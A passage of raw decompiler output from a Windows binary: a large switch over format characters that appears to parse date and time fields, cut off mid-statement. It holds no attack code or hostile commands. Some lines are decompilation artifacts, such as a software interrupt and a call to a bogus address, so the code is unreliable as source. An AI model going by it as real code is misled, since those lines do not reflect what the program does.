*(puVar72 + -8) = 0x14003b4c7;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                puVar4 = *(puVar72 + 0x290);\n                uVar2 = *(puVar72 + 0xdc);\n                *puVar4 = *puVar4 | 0x480;\n                *(puVar4 + 2) = uVar2;\n            }\n            goto code_r0x000140039f81;\n        case '\\x1f':\n            pcVar3 = (*unaff_R12)[0xb];\n            *(puVar72 + -8) = 0x14003b1a8;\n            (*pcVar3)(unaff_R12, 0x14010b3c4, 0x14010b3cd, puVar72 + 0xe0);\n            *(puVar72 + 0x38) = puVar72 + 0xe0;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + 0x40) = *(puVar72 + 0x290);\n            goto code_r0x00014003b1e8;\n        case '#':\n            *(puVar72 + 0x30) = 0x17;\n            *(puVar72 + 0x28) = 0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003b2fe;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                *(*(puVar72 + 0x280) + 8) = *(puVar72 + 0xdc);\n                **(puVar72 + 0x290) = **(puVar72 + 0x290) & 0xfe;\n            }\n            goto code_r0x000140039f81;\n        case '$':\n            *(puVar72 + 0x30) = 0xc;\n            *(puVar72 + 0x28) = 1;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003ae81;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                iVar80 = *(puVar72 + 0xdc);\n                iVar52 = iVar80;\ncode_r0x00014003aec2:\n                *(*(puVar72 + 0x280) + 8) = iVar80 + ((iVar52 * 0x2aaaaaab >> 0x21) - (iVar80 >> 0x1f)) * -0xc;\n                **(puVar72 + 0x290) = **(puVar72 + 0x290) | 1;\n            }\n            goto code_r0x000140039f81;\n        case '(':\n            *(puVar72 + 0x30) = 0x3b;\n            in_stack_00000038 = puVar72 + 0x90;\n            puVar65 = puVar72 + 0xb0;\n            *(puVar72 + 0x28) = 0;\n            arg3 = *(puVar72 + 600);\n            in_stack_00000030 = puVar72 + 0xa0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            ppiVar60 = puVar72 + 0xd8;\n            auVar90 = *(puVar72 + 0xc0);\ncode_r0x00014003ad6c:\n            *(puVar72 + 0x48) = ppiVar60;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = auVar90;\n            *(puVar72 + -8) = 0x14003ada9;\n            fcn.140038900(puVar65, arg3, in_stack_00000030, in_stack_00000038);\n            in_stack_00000038 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            ppiVar60 = *(puVar72 + 0xd8);\n            *(puVar72 + 0xc0) = in_stack_00000038;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            puVar41 = puVar72;\ncode_r0x00014003add3:\n            puVar72 = puVar41;\n            unaff_R13 = in_stack_00000038;\n            if (ppiVar60 == 0) {\n                *(*(puVar72 + 0x280) + 4) = *(puVar72 + 0xdc);\n            }\n            goto code_r0x000140039f81;\n        case '-':\n            unaff_RSI = puVar72 + 0xe0;\n            pcVar3 = (*unaff_R12)[0xb];\n            *(puVar72 + -8) = 0x14003ad00;\n            (*pcVar3)(unaff_R12, 0x14010b3cd, 0x14010b3d3, unaff_RSI);\n            puVar65 = puVar72 + 0xb0;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            goto code_r0x00014003ab6b;\n        case '.':\n            uVar59 = *(puVar72 + 0x78);\ncode_r0x00014003ac0e:\n            *(puVar72 + 0x30) = 0x3c;\n            *(puVar72 + 0x28) = 0;\n            *(puVar72 + 0x98) = uVar59;\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003ac94;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                **(puVar72 + 0x280) = *(puVar72 + 0xdc);\n            }\n            goto code_r0x000140039f81;\n        case '/':\ncode_r0x00014003ab32:\n            unaff_RSI = puVar71 + 0xe0;\n            pcVar3 = (*unaff_R12)[0xb];\n            *(puVar71 + -8) = 0x14003ab52;\n            (*pcVar3)(unaff_R12, 0x14010b3d3, 0x14010b3dc, unaff_RSI);\n            puVar65 = puVar71 + 0xb0;\n            *(puVar71 + 0xa0) = *(puVar71 + 0xc0);\n            *(puVar71 + 0xa4) = *(puVar71 + 0xc4);\n            *(puVar71 + 0xa8) = *(puVar71 + 200);\n            *(puVar71 + 0xac) = *(puVar71 + 0xcc);\n            puVar72 = puVar71;\ncode_r0x00014003ab6b:\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0x38) = unaff_RSI;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x40) = *(puVar72 + 0x290);\n            goto code_r0x00014003ab92;\n        case '0':\n            *(puVar72 + 0x30) = 0x35;\n            *(puVar72 + 0x28) = 0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003aac3;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            in_stack_00000038 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = in_stack_00000038;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            unaff_R13 = in_stack_00000038;\n            if (*(puVar72 + 0xd8) == 0) {\ncode_r0x00014003aaf6:\n                uVar50 = **(puVar72 + 0x290);\n                *(puVar72 + 0x70) = uVar50;\n                **(puVar72 + 0x290) = (*(puVar72 + 0xdc) & 0x3f) << 0x10 | 0x20 | uVar50 & 0xffc0ffdf;\n                unaff_R13 = in_stack_00000038;\n            }\n            goto code_r0x000140039f81;\n        case '2':\n            ppiVar60 = *(puVar72 + 0x78);\n            *(puVar72 + 0x30) = 0x35;\n            in_stack_00000038 = puVar72 + 0x90;\ncode_r0x00014003a953:\n            puVar65 = puVar72 + 0xb0;\n            *(puVar72 + 0x28) = 0;\n            arg3 = *(puVar72 + 600);\n            in_stack_00000030 = puVar72 + 0xa0;\n            *(puVar72 + 0x98) = ppiVar60;\n            in_XMM1_Da = *(puVar72 + 0xc0);\n            in_XMM1_Db = *(puVar72 + 0xc4);\n            in_XMM1_Dc = *(puVar72 + 200);\n            in_XMM1_Dd = *(puVar72 + 0xcc);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            ppiVar60 = *(puVar72 + 0x270);\n            *(puVar72 + 0x38) = 2;\ncode_r0x00014003a9a2:\n            *(puVar72 + 0x40) = ppiVar60;\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = in_XMM1_Da;\n            *(puVar72 + 0xa4) = in_XMM1_Db;\n            *(puVar72 + 0xa8) = in_XMM1_Dc;\n            *(puVar72 + 0xac) = in_XMM1_Dd;\n            *(puVar72 + -8) = 0x14003a9c9;\n            fcn.140038900(puVar65, arg3, in_stack_00000030, in_stack_00000038);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                uVar50 = **(puVar72 + 0x290);\n                *(puVar72 + 0x70) = uVar50;\n                **(puVar72 + 0x290) = (*(puVar72 + 0xdc) & 0x3f) << 0x10 | 0x40 | uVar50 & 0xffc0ffbf;\n            }\n            goto code_r0x000140039f81;\n        case '3':\n            puVar65 = puVar72 + 0xb0;\n            uVar58 = *(*(*(puVar72 + 0x80) + 0x10) + 0x20);\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            break;\n        case '4':\n            *(puVar72 + 0x30) = 9999;\n            *(puVar72 + 0x28) = 0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 4;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003b78b;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                *(*(puVar72 + 0x280) + 0x14) = *(puVar72 + 0xdc) + -0x76c;\n                uVar44 = *(*(puVar72 + 0x290) + 1);\n                *(puVar72 + 0x70) = uVar44;\n                *(*(puVar72 + 0x290) + 1) = uVar44 & 0xf9 | 4;\n            }\n            goto code_r0x000140039f81;\n        case '5':\n            piVar55 = *(puVar72 + 0xc0);\n            if ((piVar55 != NULL) && (uVar44 != 0)) {\n                if (piVar55[2] < piVar55[3]) {\n                    iVar46 = *piVar55[2];\n                }\n                else {\n                    pcVar3 = *(*piVar55 + 0x48);\n                    *(puVar72 + -8) = 0x14003be17;\n                    iVar46 = (*pcVar3)();\n                }\n                if (iVar46 == -1) {\n                    *(puVar72 + 0xc0) = 0;\n                }\n            }\n            pcVar3 = (*unaff_R12)[2];\n            *(puVar72 + -8) = 0x14003b597;\n            cVar43 = (*pcVar3)(unaff_R12);\n            if (cVar43 != '\\0') {\n                unaff_R13 = puVar72 + 0xd8;\n                unaff_R14 = puVar72 + 0xe0;\n                *(puVar72 + 0x30) = 0xe;\n                *(puVar72 + 0x40) = unaff_R13;\n                arg3 = *(puVar72 + 600);\n                in_stack_00000038 = puVar72 + 0x90;\n                puVar65 = puVar72 + 0xb0;\n                *(puVar72 + 0x20) = unaff_R14;\n                in_stack_00000030 = puVar72 + 0xa0;\n                in_XMM1_Da = *(puVar72 + 0xc0);\n                in_XMM1_Db = *(puVar72 + 0xc4);\n                in_XMM1_Dc = *(puVar72 + 200);\n                in_XMM1_Dd = *(puVar72 + 0xcc);\n                *(puVar72 + 0x98) = *(puVar72 + 0x78);\n                *(puVar72 + 0x88) = puVar65;\n                *(puVar72 + 0x38) = *(puVar72 + 0x270);\n                uVar59 = *0x14010ff10;\n                unaff_R15 = in_stack_00000038;\ncode_r0x00014003b617:\n                *(puVar72 + 0x90) = unaff_RDI;\n                *(puVar72 + 0x28) = uVar59;\n                *(puVar72 + 0x70) = in_stack_00000030;\n                *(puVar72 + 0xa0) = in_XMM1_Da;\n                *(puVar72 + 0xa4) = in_XMM1_Db;\n                *(puVar72 + 0xa8) = in_XMM1_Dc;\n                *(puVar72 + 0xac) = in_XMM1_Dd;\n                *(puVar72 + -8) = 0x14003b636;\n                fcn.140038e30(puVar65, arg3, in_stack_00000030, in_stack_00000038, *(puVar72 + 0x20), *(puVar72 + 0x28)\n                              , *(puVar72 + 0x30), *(puVar72 + 0x38), *(puVar72 + 0x40), *(puVar72 + 0x48), \n                              *(puVar72 + 0x50), *(puVar72 + 0x58), *(puVar72 + 0x60), *(puVar72 + 0x68), \n                              *(puVar72 + 0x70), *(puVar72 + 0x78), *(puVar72 + 0x80));\n                uVar48 = *(puVar72 + 0xb8);\n                unaff_RSI = uVar48;\n                piVar55 = *(puVar72 + 0xb0);\n                cVar43 = uVar48 == 0xffff;\n                *(puVar72 + 0xc0) = piVar55;\n                *(puVar72 + 200) = uVar48;\n                if ((piVar55 != NULL) && (cVar43)) {\n                    if (piVar55[2] < piVar55[3]) {\n                        iVar46 = *piVar55[2];\n                    }\n                    else {\n                        pcVar3 = *(*piVar55 + 0x48);\n                        *(puVar72 + -8) = 0x14003bfe2;\n                        iVar46 = (*pcVar3)();\n                    }\n                    if (iVar46 == -1) {\n                        *(puVar72 + 0xc0) = 0;\n                    }\n                    cVar43 = iVar46 == -1;\n                }\n                cVar64 = unaff_RBP;\n                if (cVar64 == '\\0') {\n                    cVar64 = arg1;\n                }\n                else {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar46 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar55 = *unaff_RDI;\n                        *(puVar72 + 100) = cVar43;\n                        pcVar3 = piVar55[9];\n                        *(puVar72 + -8) = 0x14003bfc3;\n                        iVar46 = (*pcVar3)(unaff_RDI);\n                        cVar43 = *(puVar72 + 100);\n                    }\n                    if (iVar46 == -1) {\n                        unaff_RDI = NULL;\n                    }\n                    else {\n                        cVar64 = '\\0';\n                    }\n                }\n                *(puVar72 + 100) = *(puVar72 + 0xd8);\n                if ((cVar43 != cVar64) && ((*(puVar72 + 0xd8) | *(puVar72 + 0xe0)) == 0)) {\n                    *(puVar72 + -8) = 0x14003b6a8;\n                    iVar46 = fcn.140029f90(puVar72 + 0xc0);\n                    pcVar3 = (*unaff_R12)[10];\n                    *(puVar72 + -8) = 0x14003b6b9;\n                    iVar47 = (*pcVar3)(unaff_R12, 0x2d);\n                    if (iVar46 != iVar47) {\n                        *(puVar72 + -8) = 0x14003b6ca;\n                        iVar46 = fcn.140029f90(puVar72 + 0xc0);\n                        pcVar3 = (*unaff_R12)[10];\n                        *(puVar72 + -8) = 0x14003b6db;\n                        iVar47 = (*pcVar3)(unaff_R12);\n                        if (iVar46 != iVar47) {\n                            unaff_RSI = *(puVar72 + 200);\n                            *(puVar72 + 100) = 0;\n                            goto code_r0x00014003af84;\n                        }\n                    }\n                    uVar58 = *(puVar72 + 0x88);\n                    *(puVar72 + 0x48) = unaff_R13;\n                    *(puVar72 + 0x28) = 0;\n                    uVar5 = *(puVar72 + 0x78);\n                    *(puVar72 + 0x40) = *(puVar72 + 0x270);\n                    *(puVar72 + 0x30) = 0x17;\n                    *(puVar72 + 0x20) = unaff_R14;\n                    *(puVar72 + 0x38) = 2;\n                    *(puVar72 + 0x98) = uVar5;\n                    *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n                    *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n                    *(puVar72 + 0xa8) = *(puVar72 + 200);\n                    *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n                    *(puVar72 + 0x90) = unaff_RDI;\n                    *(puVar72 + -8) = 0x14003becd;\n                    fcn.140038900(uVar58, *(puVar72 + 600), *(puVar72 + 0x70), unaff_R15);\n                    *(puVar72 + 0x48) = unaff_R13;\n                    *(puVar72 + 0x28) = 0;\n                    *(puVar72 + 0x38) = 2;\n                    *(puVar72 + 200) = *(puVar72 + 0xb8);\n                    *(puVar72 + 0x30) = 0x3b;\n                    *(puVar72 + 0x40) = *(puVar72 + 0x270);\n                    *(puVar72 + 0x20) = unaff_R14;\n                    *(puVar72 + 0xc0) = *(puVar72 + 0xb0);\n                    *(puVar72 + 0x98) = uVar5;\n                    *(puVar72 + 0x90) = unaff_RDI;\n                    *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n                    *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n                    *(puVar72 + 0xa8) = *(puVar72 + 200);\n                    *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n                    *(puVar72 + -8) = 0x14003bf56;\n                    fcn.140038900(uVar58, *(puVar72 + 600), *(puVar72 + 0x70), unaff_R15);\n                    unaff_RSI = *(puVar72 + 0xb8);\n                    *(puVar72 + 0xc0) = *(puVar72 + 0xb0);\n                    *(puVar72 + 200) = *(puVar72 + 0xb8);\n                    *(puVar72 + 100) = *(puVar72 + 0xd8);\n                }\n                goto code_r0x00014003af84;\n            }\n            goto code_r0x000140039f66;\n        case '>':\n            uVar58 = *(*(*(puVar72 + 0x80) + 0x10) + 0x30);\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0x38) = uVar58;\n            *(puVar72 + 0x40) = *(puVar72 + 0x290);\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\ncode_r0x00014003b1e8:\n            *(puVar72 + 0x30) = *(puVar72 + 0x280);\n            *(puVar72 + 0x28) = puVar72 + 0xd8;\n            *(puVar72 + 0x20) = *(puVar72 + 0x270);\n            *(puVar72 + -8) = 0x14003b22c;\n            fcn.140039d50(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            in_stack_00000038 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = in_stack_00000038;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            unaff_R13 = in_stack_00000038;\n            if (*(puVar72 + 0xd8) == 0) {\ncode_r0x00014003b25f:\n                *(*(puVar72 + 0x290) + 1) = *(*(puVar72 + 0x290) + 1) | 4;\n                unaff_R13 = in_stack_00000038;\n            }\n            goto code_r0x000140039f81;\n        case '?':\n        case '@':\n            piVar55 = *(puVar72 + 0xc0);\n            if ((piVar55 != NULL) && (uVar44 != 0)) {\n                if (piVar55[2] < piVar55[3]) {\n                    iVar46 = *piVar55[2];\n                }\n                else {\n                    pcVar3 = *(*piVar55 + 0x48);\n                    *(puVar72 + -8) = 0x14003be40;\n                    iVar46 = (*pcVar3)();\n                }\n                if (iVar46 == -1) {\n                    *(puVar72 + 0xc0) = 0;\n                }\n            }\n            pcVar3 = (*unaff_R12)[2];\n            *(puVar72 + -8) = 0x14003a5bc;\n            cVar43 = (*pcVar3)(unaff_R12, 0x20, iVar46);\n            if (cVar43 != '\\0') {\n                piVar55 = *(puVar72 + 0xc0);\n                if (piVar55[2] < piVar55[3]) {\n                    piVar55[2] = piVar55[2] + 2;\n                }\n                else {\n                    pcVar3 = *(*piVar55 + 0x50);\n                    *(puVar72 + -8) = 0x14003bda8;\n                    (*pcVar3)();\n                }\n                *(puVar72 + 200) = 0xffff;\n            }\n            *(puVar72 + 0x30) = 0x1f;\n            in_stack_00000038 = puVar72 + 0x90;\n            puVar65 = puVar72 + 0xb0;\n            *(puVar72 + 0x28) = 1;\n            arg3 = *(puVar72 + 600);\n            in_stack_00000030 = puVar72 + 0xa0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            in_XMM5_Da = *(puVar72 + 0xc0);\n            in_XMM5_Db = *(puVar72 + 0xc4);\n            in_XMM5_Dc = *(puVar72 + 200);\n            in_XMM5_Dd = *(puVar72 + 0xcc);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\ncode_r0x00014003a63a:\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = in_XMM5_Da;\n            *(puVar72 + 0xa4) = in_XMM5_Db;\n            *(puVar72 + 0xa8) = in_XMM5_Dc;\n            *(puVar72 + 0xac) = in_XMM5_Dd;\n            *(puVar72 + -8) = 0x14003a64f;\n            fcn.140038900(puVar65, arg3, in_stack_00000030, in_stack_00000038);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                *(*(puVar72 + 0x280) + 0xc) = *(puVar72 + 0xdc);\n                **(puVar72 + 0x290) = **(puVar72 + 0x290) | 0x410;\n            }\n            goto code_r0x000140039f81;\n        case 'E':\n            *(puVar72 + 0x30) = 0x16e;\n            *(puVar72 + 0x28) = 1;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 3;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003b12d;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                puVar65 = *(puVar72 + 0x280);\n                *(puVar65 + 0x1c) = *(puVar72 + 0xdc) + -1;\n                puVar73 = puVar72;\ncode_r0x00014003b16a:\n                *(unaff_RBP + -0x77) = *(unaff_RBP + -0x77) + puVar65;\n                pcVar3 = swi(0x83);\n                (*pcVar3)();\n                puVar72 = puVar73 + 1;\n                *puVar73 = 0x14003b178;\n                func_0x00015c453a79();\n                *puVar73[0x53] = *puVar73[0x53] | 4;\n            }\n            goto code_r0x000140039f81;\n        case 'H':\n            *(puVar72 + 0x30) = 0xc;\n            in_stack_00000038 = puVar72 + 0x90;\n            puVar65 = puVar72 + 0xb0;\n            *(puVar72 + 0x28) = 1;\n            arg3 = *(puVar72 + 600);\n            in_stack_00000030 = puVar72 + 0xa0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            pcVar53 = puVar72 + 0xd8;\n            in_XMM5_Da = *(puVar72 + 0xc0);\n            in_XMM5_Db = *(puVar72 + 0xc4);\n            in_XMM5_Dc = *(puVar72 + 200);\n            in_XMM5_Dd = *(puVar72 + 0xcc);\ncode_r0x00014003b3a4:\n            *(puVar72 + 0x48) = pcVar53;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = in_XMM5_Da;\n            *(puVar72 + 0xa4) = in_XMM5_Db;\n            *(puVar72 + 0xa8) = in_XMM5_Dc;\n            *(puVar72 + 0xac) = in_XMM5_Dd;\n            *(puVar72 + -8) = 0x14003b3e1;\n            fcn.140038900(puVar65, arg3, in_stack_00000030, in_stack_00000038);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                *(*(puVar72 + 0x280) + 0x10) = *(puVar72 + 0xdc) + -1;\n                **(puVar72 + 0x290) = **(puVar72 + 0x290) | 8;\n            }\n            goto code_r0x000140039f81;\n        case 'I':\n        case 'O':\n            unaff_R13 = *(puVar72 + 0xc0);\n            unaff_R14 = NULL;\n            while( true ) {\n                uVar44 = unaff_RSI == -1;\n                bVar86 = unaff_R13 != NULL && uVar44;\n                arg3 = bVar86;\n                if (bVar86) {\n                    if (unaff_R13[2] < unaff_R13[3]) {\n                        iVar46 = *unaff_R13[2];\n                    }\n                    else {\n                        piVar55 = *unaff_R13;\n                        *(puVar72 + 0x70) = bVar86;\n                        pcVar3 = piVar55[9];\n                        *(puVar72 + -8) = 0x14003bba2;\n                        iVar46 = (*pcVar3)(unaff_R13);\n                        arg3 = *(puVar72 + 0x70);\n                    }\n                    uVar87 = arg3;\n                    uVar44 = 0;\n                    if (iVar46 == -1) {\n                        unaff_R13 = NULL;\n                        arg3 = NULL;\n                        *(puVar72 + 0xc0) = 0;\n                        uVar44 = uVar87;\n                    }\n                }\n                uVar87 = arg1;\n                uVar82 = unaff_RDI != NULL & uVar87;\n                if (uVar82 != 0) {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar46 = *unaff_RDI[2];\n                    }\n                    else {\n                        piVar55 = *unaff_RDI;\n                        *(puVar72 + 0x70) = arg3;\n                        pcVar3 = piVar55[9];\n                        *(puVar72 + -8) = 0x14003bbb9;\n                        iVar46 = (*pcVar3)(unaff_RDI);\n                        arg3 = *(puVar72 + 0x70);\n                    }\n                    if (iVar46 == -1) {\n                        unaff_RDI = NULL;\n                        uVar87 = uVar82;\n                    }\n                    else {\n                        uVar87 = unaff_R14;\n                    }\n                }\n                if (uVar44 == uVar87) break;\ncode_r0x00014003a84f:\n                if (arg3 != '\\0') {\n                    if (unaff_R13[2] < unaff_R13[3]) {\n                        iVar46 = *unaff_R13[2];\n                    }\n                    else {\n                        pcVar3 = (*unaff_R13)[9];\n                        *(puVar72 + -8) = 